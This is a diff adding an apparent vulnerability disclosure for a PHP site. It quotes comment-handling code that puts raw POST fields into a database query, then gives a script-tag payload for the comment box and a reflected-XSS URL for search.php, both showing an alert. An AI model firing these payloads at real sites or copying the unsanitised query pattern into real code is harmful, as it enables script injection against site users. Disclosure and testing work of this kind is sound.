@@ -1,0 +1,19 @@
+
+&#039;item.php&#039;
+http://www.example.com/item.php?action=post
+------------------------------
+    case &#039;add_comment&#039;:
+        dbExec(&quot;INSERT INTO %sitem_comment (item_id, author_name, author_email, body) VALUES (%d, &#039;%s&#039;, &#039;%s&#039;, &#039;%s&#039;)&quot;,
+            DB_TABLE_PREFIX, $_POST[&#039;id&#039;], $_POST[&#039;authorName&#039;], $_POST[&#039;authorEmail&#039;], $_POST[&#039;body&#039;]);
+        header(&#039;Location: item.php?id=&#039; . $_POST[&#039;id&#039;]);
+        break;
+    case &#039;post&#039;:
+------------------------------
+ Put the code below into the comment box
+&quot;&gt;&lt;script&gt;alert(String.fromCharCode(88, 83, 83));&lt;/script&gt;
+
+
+&#039;search.php&#039;
+http://www.example.com/search.php?pattern=&lt;script&gt;alert(String.fromCharCode(88, 83, 83));&lt;/script&gt;
+
+
